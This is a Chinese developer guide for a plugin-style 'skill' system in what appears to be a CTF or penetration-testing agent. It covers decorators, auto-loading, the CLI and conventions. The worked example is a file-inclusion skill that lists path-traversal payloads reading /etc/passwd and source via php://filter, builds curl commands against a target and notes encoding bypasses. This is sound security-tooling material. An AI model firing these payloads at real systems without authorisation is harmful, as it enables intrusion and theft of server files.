# 可扩展技能系统 - 开发指南

## 概述

技能系统现在支持自动加载和注册，添加新技能只需创建一个文件即可，无需修改其他代码。

## 核心特性

✅ **自动发现**：自动扫描并加载所有技能
✅ **装饰器注册**：使用`@register_skill`自动注册
✅ **模板生成**：一键生成技能模板
✅ **CLI工具**：命令行管理技能
✅ **零配置**：创建文件即可使用

## 快速开始

### 方式1：使用CLI工具（推荐）

```bash
# 交互式创建新技能
python skill_cli.py new

# 按提示输入：
# - 技能ID: web_lfi
# - 技能名称: 文件包含检测与利用
# - 分类: WEB
# - 描述: 检测和利用LFI/RFI漏洞
# - 前置条件: target_url
# - 需要工具: execute_shell
# - 难度: medium
```

### 方式2：使用Python代码

```python
from src.skills.skill_generator import create_skill

create_skill(
    skill_id="web_lfi",
    skill_name="文件包含检测与利用",
    category="WEB",
    description="检测和利用LFI/RFI漏洞",
    prerequisites=["target_url"],
    tools_required=["execute_shell"],
    difficulty="medium"
)
```

### 方式3：手动创建

1. 在对应分类目录下创建文件（如`src/skills/web/lfi.py`）
2. 使用装饰器和基类：

```python
from typing import Dict, Any
from ..base import Skill, SkillCategory, SkillResult
from ..decorators import register_skill

@register_skill
class LFISkill(Skill):
    def __init__(self):
        super().__init__()
        self.id = "web_lfi"
        self.name = "文件包含检测与利用"
        self.category = SkillCategory.WEB
        self.description = "检测和利用LFI/RFI漏洞"
        self.prerequisites = ["target_url"]
        self.tools_required = ["execute_shell"]
        self.difficulty = "medium"

    def execute(self, context: Dict[str, Any], executor: Any) -> SkillResult:
        # 实现技能逻辑
        ...
```

## 技能结构

### 必需字段

```python
self.id = "web_xxx"              # 唯一标识符
self.name = "技能名称"            # 显示名称
self.category = SkillCategory.WEB # 分类
self.description = "技能描述"     # 简短描述
self.prerequisites = ["target_url"] # 前置条件
self.tools_required = ["execute_shell"] # 需要的工具
self.difficulty = "medium"        # 难度等级
```

### execute()方法

```python
def execute(self, context: Dict[str, Any], executor: Any) -> SkillResult:
    """
    执行技能

    Args:
        context: 执行上下文，包含target_url等信息
        executor: 工具执行器，提供execute_shell()和execute_python()方法

    Returns:
        SkillResult: 包含success, message, data, commands, findings
    """
    # 1. 检查前置条件
    ok, msg = self.check_prerequisites(context)
    if not ok:
        return SkillResult(success=False, message=msg)

    # 2. 准备命令和发现
    commands = []
    findings = []

    # 3. 生成测试命令
    target_url = context["target_url"]
    cmd1 = f"curl '{target_url}'"
    commands.append(cmd1)
    findings.append("测试基础访问")

    # 4. 构建建议消息
    message = f"""技能执行建议

目标: {target_url}

步骤：
1. 基础测试
2. 漏洞检测
3. 深入利用

关键命令：
{chr(10).join(f'  {i+1}. {cmd}' for i, cmd in enumerate(commands[:5]))}
"""

    # 5. 返回结果
    return SkillResult(
        success=True,
        message=message,
        data={"target": target_url},
        commands=commands,
        findings=findings
    )
```

## 技能分类

### Web技能 (src/skills/web/)
- SQL注入
- XSS
- SSRF
- 文件包含
- 命令注入
- 反序列化
- XXE
- ...

### Crypto技能 (src/skills/crypto/)
- Base64解码
- 凯撒密码
- RSA攻击
- 哈希碰撞
- ...

### Reverse技能 (src/skills/reverse/)
- 字符串提取
- 反编译
- 动态调试
- ...

### Pwn技能 (src/skills/pwn/)
- checksec
- ROP
- 缓冲区溢出
- ...

### Misc技能 (src/skills/misc/)
- 文件分析
- 隐写术
- 取证
- ...

## CLI工具使用

### 列出所有技能

```bash
python skill_cli.py list
```

输出：
```
共有 4 个技能:

ID                   名称                   分类         难度
======================================================================
web_sqli             SQL注入检测与利用           web        medium
web_php_analysis     PHP源码分析              web        medium
web_ssrf             SSRF检测与利用            web        medium
web_xss              XSS检测与利用             web        medium
```

### 查看技能详情

```bash
python skill_cli.py show web_sqli
```

输出：
```
技能详情:
  ID: web_sqli
  名称: SQL注入检测与利用
  分类: web
  描述: 检测目标是否存在SQL注入漏洞，并尝试利用获取数据
  前置条件: target_url
  需要工具: execute_shell
  难度: medium
```

### 创建新技能

```bash
python skill_cli.py new
```

交互式输入各项信息，自动生成技能文件。

## 自动加载机制

### 工作原理

1. **装饰器注册**：`@register_skill`装饰器在类定义时自动注册
2. **自动扫描**：`auto_loader.py`扫描所有分类目录
3. **动态导入**：使用`importlib`动态导入所有技能模块
4. **全局注册**：所有技能自动注册到`skill_registry`

### 加载流程

```
程序启动
    ↓
导入 src.skills.loader
    ↓
调用 load_all_skills()
    ↓
调用 auto_load_skills()
    ↓
扫描 web/, crypto/, reverse/, pwn/, misc/
    ↓
导入所有 .py 文件
    ↓
@register_skill 装饰器执行
    ↓
技能自动注册到 skill_registry
    ↓
完成加载
```

### 目录结构

```
src/skills/
├── __init__.py
├── base.py              # 基类
├── registry.py          # 注册中心
├── decorators.py        # 装饰器
├── auto_loader.py       # 自动加载器
├── loader.py            # 加载入口
├── skill_generator.py   # 模板生成器
├── web/
│   ├── __init__.py
│   ├── sqli.py         # SQL注入技能
│   ├── php_analysis.py # PHP分析技能
│   ├── ssrf.py         # SSRF技能
│   └── xss.py          # XSS技能（示例）
├── crypto/
│   └── __init__.py
├── reverse/
│   └── __init__.py
├── pwn/
│   └── __init__.py
└── misc/
    └── __init__.py
```

## 完整示例

### 创建文件包含技能

```python
from typing import Dict, Any
from ..base import Skill, SkillCategory, SkillResult
from ..decorators import register_skill

@register_skill
class LFISkill(Skill):
    """
    文件包含检测与利用技能
    """

    def __init__(self):
        super().__init__()
        self.id = "web_lfi"
        self.name = "文件包含检测与利用"
        self.category = SkillCategory.WEB
        self.description = "检测和利用LFI/RFI漏洞"
        self.prerequisites = ["target_url"]
        self.tools_required = ["execute_shell"]
        self.difficulty = "medium"

    def execute(self, context: Dict[str, Any], executor: Any) -> SkillResult:
        ok, msg = self.check_prerequisites(context)
        if not ok:
            return SkillResult(success=False, message=msg)

        target_url = context["target_url"]
        commands = []
        findings = []

        # LFI测试
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php"
        ]

        for payload in lfi_payloads:
            cmd = f"curl '{target_url}?file={payload}'"
            commands.append(cmd)

        findings.append("测试LFI基础Payload")
        findings.append("测试路径遍历绕过")
        findings.append("测试URL编码绕过")
        findings.append("测试PHP伪协议")

        message = f"""文件包含检测与利用技能已准备就绪

目标: {target_url}

测试步骤：
1. 基础LFI测试（../../../etc/passwd）
2. 路径遍历绕过（....//....//）
3. URL编码绕过（..%2f..%2f）
4. PHP伪协议（php://filter）
5. 日志包含
6. Session文件包含

关键命令：
{chr(10).join(f'  {i+1}. {cmd}' for i, cmd in enumerate(commands[:4]))}
... 共{len(commands)}条命令

绕过技巧：
- 路径遍历：....//、..\\、..;/
- 编码绕过：URL编码、双重编码
- NULL字节：%00（PHP<5.3.4）
- 伪协议：php://、file://、data://

请安全专家逐步执行测试。
"""

        return SkillResult(
            success=True,
            message=message,
            data={"target": target_url, "payloads": lfi_payloads},
            commands=commands,
            findings=findings
        )
```

保存为`src/skills/web/lfi.py`，重启程序即可使用！

## 最佳实践

### 1. 命名规范

- **技能ID**：`category_name`格式，如`web_sqli`、`crypto_base64`
- **类名**：驼峰命名+Skill后缀，如`SQLInjectionSkill`、`Base64DecodeSkill`
- **文件名**：小写+下划线，如`sqli.py`、`base64_decode.py`

### 2. 文档规范

- 类文档字符串：简要说明技能用途
- execute()文档字符串：说明参数和返回值
- message字段：提供清晰的执行建议和步骤

### 3. 命令组织

- 按测试步骤组织命令
- 提供关键命令列表
- 包含绕过技巧说明

### 4. 错误处理

- 始终检查前置条件
- 返回清晰的错误消息
- 处理异常情况

## 测试技能

```python
from src.skills.registry import skill_registry

# 获取技能
skill = skill_registry.get("web_lfi")

# 准备上下文
context = {"target_url": "http://example.com/index.php"}

# 模拟执行器
class MockExecutor:
    def execute_shell(self, cmd):
        return f"[模拟] {cmd}"

# 执行技能
result = skill.execute(context, MockExecutor())

print(result.message)
print(f"命令数: {len(result.commands)}")
print(f"发现数: {len(result.findings)}")
```

## 与Agent集成

技能创建后自动集成到Agent系统：

1. **自动加载**：程序启动时自动加载
2. **漏洞检测**：VulnerabilityDetector可推荐技能
3. **战略专家**：可通过`use_skill`调用
4. **提示词**：自动生成技能列表

## 常见问题

### Q: 创建技能后没有加载？
A: 确保文件在正确的分类目录下，且使用了`@register_skill`装饰器。

### Q: 如何修改已有技能？
A: 直接编辑对应的.py文件，重启程序即可。

### Q: 如何删除技能？
A: 删除对应的.py文件，重启程序即可。

### Q: 技能ID冲突怎么办？
A: 确保每个技能的ID唯一，建议使用`category_name`格式。

### Q: 如何添加新的技能分类？
A: 在`src/skills/`下创建新目录，在`auto_loader.py`的`categories`列表中添加。

## 下一步

1. 实现更多Web技能（XSS、LFI、XXE等）
2. 添加Crypto技能
3. 添加Reverse技能
4. 添加Pwn技能
5. 完善技能文档
6. 添加技能测试用例

## 贡献技能

欢迎贡献新技能！步骤：

1. 使用`skill_cli.py new`创建技能
2. 实现execute()方法
3. 测试技能功能
4. 提交PR

技能模板已经包含所有必要的结构，只需填充具体逻辑即可！
